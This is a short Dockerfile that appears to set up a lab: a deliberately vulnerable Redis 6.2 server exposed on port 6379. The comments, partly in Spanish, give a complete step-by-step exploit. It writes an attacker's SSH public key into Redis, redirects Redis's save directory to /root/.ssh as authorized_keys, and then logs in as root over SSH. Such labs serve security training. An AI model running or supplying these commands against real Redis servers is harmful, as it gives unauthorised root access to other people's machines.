FROM redis:6.2

#docker build -t vulnerable-redis .
#docker run -d -p 6379:6379 vulnerable-redis

#Para explotar
#ssh-keygen -f /tmp/redis_key
#(echo -e "\n\n"; cat /tmp/redis_key.pub; echo -e "\n\n") | redis-cli -h <docker-host> -x set ssh_key
#redis-cli -h <docker-host> config set dir /root/.ssh/
#redis-cli -h <docker-host> config set dbfilename "authorized_keys"
#redis-cli -h <docker-host> save
#ssh -i /tmp/redis_key root@<docker-host>
